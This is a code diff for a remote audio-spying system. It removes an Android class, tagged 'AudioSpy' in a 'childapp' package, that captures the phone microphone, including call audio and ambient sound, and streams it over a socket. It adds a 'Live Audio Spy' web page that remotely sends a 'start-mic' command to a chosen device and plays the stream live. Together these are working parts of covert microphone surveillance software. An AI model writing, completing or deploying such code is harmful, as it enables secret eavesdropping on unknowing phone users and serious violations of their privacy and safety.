@@ -1,90 +1,143 @@
-package com.example.childapp;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Audio Spy</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        h2 { margin-bottom: 20px; }
+        .visualizer {
+            width: 80%;
+            height: 100px;
+            background: #000;
+            border: 1px solid #0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .bar {
+            width: 100%;
+            height: 2px;
+            background: #0f0;
+            box-shadow: 0 0 10px #0f0;
+            transition: height 0.1s;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover { background: #0f0; color: #000; }
+        .status { margin-top: 10px; font-size: 14px; color: #aaa; }
+    </style>
+</head>
+<body>
 
-import android.annotation.SuppressLint;
-import android.media.AudioFormat;
-import android.media.AudioRecord;
-import android.media.MediaRecorder;
-import android.util.Log;
+    <h2>📡 LIVE AUDIO STREAM</h2>
+    
+    <div class="visualizer">
+        <div id="vis-bar" class="bar"></div>
+    </div>
 
-import io.socket.client.Socket;
+    <button id="btn-listen" onclick="startListening()">🔇 CLICK TO START LISTENING</button>
+    <p class="status" id="status-text">Waiting for connection...</p>
 
-public class LiveAudioManager {
+    <script src="/socket.io/socket.io.js"></script>
 
-    private Socket mSocket;
-    private String deviceId;
-    private boolean isRecording = false;
-    private AudioRecord audioRecord;
-    private Thread recordingThread;
+    <script>
+        const socket = io();
+        
+        // URL se Device ID nikalo (Example: view_audio.html?id=DEVICE123)
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceID = urlParams.get('id');
 
-    // 🔥 SETTING: 16kHz (Must match HTML)
-    private static final int SAMPLE_RATE = 16000;
-    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
-    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
+        const statusText = document.getElementById("status-text");
+        const btn = document.getElementById("btn-listen");
+        const visBar = document.getElementById("vis-bar");
 
-    public LiveAudioManager(Socket socket, String deviceId) {
-        this.mSocket = socket;
-        this.deviceId = deviceId;
-    }
+        let audioContext;
+        let nextTime = 0;
 
-    @SuppressLint("MissingPermission") // Permissions MainActivity mein checked hain
-    public void startAudioStream() {
-        if (isRecording) return;
+        if (!deviceID) {
+            statusText.innerText = "❌ Error: No Device ID Found in URL";
+        } else {
+            // Join Room
+            socket.emit("join", deviceID);
+            statusText.innerText = `🔗 Connected to: ${deviceID}`;
+            
+            // Command bhejo Android ko ki Mic chalu kare
+            socket.emit("send-command", {
+                targetId: deviceID,
+                command: "start-mic" 
+            });
+        }
 
-        int minBufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
-
-        try {
-            // MIC source call audio aur aas paas ki aawaz dono uthata hai
-            audioRecord = new AudioRecord(
-                    MediaRecorder.AudioSource.MIC,
-                    SAMPLE_RATE,
-                    CHANNEL_CONFIG,
-                    AUDIO_FORMAT,
-                    minBufSize
-            );
-
-            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
-                audioRecord.startRecording();
-                isRecording = true;
-                Log.d("AudioSpy", "Started Streaming at 16000Hz");
-
-                recordingThread = new Thread(() -> {
-                    // Buffer size chota rakha hai taaki delay na ho
-                    byte[] buffer = new byte[4096]; 
-
-                    while (isRecording) {
-                        int bytesRead = audioRecord.read(buffer, 0, buffer.length);
-                        
-                        if (bytesRead > 0) {
-                            if (mSocket != null && mSocket.connected()) {
-                                // Raw Binary Data bhej rahe hain (Fastest)
-                                mSocket.emit("audio-stream", buffer);
-                            }
-                        }
-                    }
+        function startListening() {
+            if (!audioContext) {
+                // Audio Context banau (Browser security ke liye click zaroori hai)
+                audioContext = new (window.AudioContext || window.webkitAudioContext)({
+                    sampleRate: 16000, // 🔥 Must match Android (16000Hz)
                 });
-                recordingThread.start();
-            } else {
-                Log.e("AudioSpy", "Mic Init Failed");
+                
+                btn.innerText = "🔊 LISTENING...";
+                btn.style.background = "#0f0";
+                btn.style.color = "#000";
+                statusText.innerText = "Receiving Audio Stream...";
             }
-        } catch (Exception e) {
-            Log.e("AudioSpy", "Error: " + e.getMessage());
         }
-    }
 
-    public void stopAudioStream() {
-        isRecording = false;
-        try {
-            if (audioRecord != null) {
-                audioRecord.stop();
-                audioRecord.release();
-                audioRecord = null;
+        // 🔥 RECEIVE AUDIO FROM SERVER
+        socket.on("audio-stream", (arrayBuffer) => {
+            if (!audioContext) return; // Agar user ne click nahi kiya to ignore karo
+
+            // Raw PCM Data (Int16) ko Float32 mein convert karo (WebAudio ke liye)
+            const audioData = new Int16Array(arrayBuffer);
+            const float32Data = new Float32Array(audioData.length);
+
+            // Conversion Loop
+            for (let i = 0; i < audioData.length; i++) {
+                float32Data[i] = audioData[i] / 32768; // Convert -32768..32767 to -1.0..1.0
             }
-            if (recordingThread != null) {
-                recordingThread = null;
+
+            // Play Buffer
+            playAudioChunk(float32Data);
+            
+            // Visualizer Effect (Fake but responsive)
+            let volume = Math.abs(float32Data[0]) * 1000; 
+            visBar.style.height = Math.min(volume, 100) + "px";
+        });
+
+        function playAudioChunk(float32Data) {
+            const buffer = audioContext.createBuffer(1, float32Data.length, 16000);
+            buffer.getChannelData(0).set(float32Data);
+
+            const source = audioContext.createBufferSource();
+            source.buffer = buffer;
+            source.connect(audioContext.destination);
+
+            // Seamless Playing Logic (Queue System)
+            if (nextTime < audioContext.currentTime) {
+                nextTime = audioContext.currentTime;
             }
-            Log.d("AudioSpy", "Mic Stopped");
-        } catch (Exception e) {
-            e.printStackTrace();
+            source.start(nextTime);
+            nextTime += buffer.duration;
         }
-    }
-}
+    </script>
+</body>
+</html>
